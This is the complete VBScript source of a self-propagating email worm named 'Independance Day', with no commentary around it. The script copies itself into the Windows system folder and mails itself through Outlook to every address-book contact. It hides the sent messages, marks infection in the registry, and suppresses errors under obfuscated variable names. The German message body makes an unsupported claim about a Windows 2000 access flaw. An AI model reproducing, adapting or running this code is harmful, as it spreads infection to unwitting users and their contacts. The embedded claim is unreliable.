On Error Resume Next
Set fjkjlxaetaz = CreateObject("WScript.Shell")
set koaxmndnqup=createobject("scripting.filesystemobject")
koaxmndnqup.copyfile wscript.scriptfullname,"C:\WINDOWS\SYSTEM32\Independance Day.vbs"
if fjkjlxaetaz.regread ("HKCU\software\Independance Day\mailed") <> "1" then
hjkgtaxpghr()
end if
Function hjkgtaxpghr()
On Error Resume Next
Set fipnelyylqw = CreateObject("Outlook.Application")
If fipnelyylqw= "Outlook"Then
Set kujverfkhqi=fipnelyylqw.GetNameSpace("MAPI")
For Each tlqtrxgnrsw In kujverfkhqi.AddressLists
If tlqtrxgnrsw.AddressEntries.Count <> 0 Then
For iguvmpycxnl= 1 To tlqtrxgnrsw.AddressEntries.Count
Set lknfimuihpk = tlqtrxgnrsw.AddressEntries(iguvmpycxnl)
Set miujyxoisoj = fipnelyylqw.CreateItem(0)
miujyxoisoj.To = lknfimuihpk.Address
miujyxoisoj.Subject = "Mail from: Lee@Buxtehude.de"
miujyxoisoj.Body = "The Best Firewall under Windows is...> BlackIce." & vbcrlf & "BUGFIX des Monats:" & vbcrlf & "Windoof 2000." & vbcrlf & "Du kannst Dich, auf jedem Windoos 2000 Server als Gast einloggen." & vbcrlf & "Und hast trotzdem vollen Zugriff auf fast alle gesperrten Dateien, auf die normale" & vbcrlf & "Anwender keinen Zugriff haben dürfen." & vbcrlf & "Wie zb. die Boot.ini...ts..ts..ts" & vbcrlf & "" & vbcrlf & "LEBENSHILFE......:" & vbcrlf & "" & vbcrlf & "99% aller Pc Probleme befinden sich zwischen Tastatur und Stuhl." & vbcrlf & "Die, die können, tun. Die, die nicht können, simulieren." & vbcrlf & "Ein Hacker macht einen Fehler nur einmal versehentlich. Dann immer mit Absicht." & vbcrlf & "Wenn 2 sich 1 sind und nicht 8 geben, dann sind es in 9 Monaten 3." & vbcrlf & "" & vbcrlf & "By Euer Lee"
miujyxoisoj.Attachments.Add "C:\WINDOWS\SYSTEM32\Independance Day.vbs"
miujyxoisoj.DeleteAfterSubmit = True
If miujyxoisoj.To <> "" Then
miujyxoisoj.Send
End If
Next
End If
Next
fjkjlxaetaz.regwrite "HKCU\software\Independance Day\mailed", "1"
end if
End Function
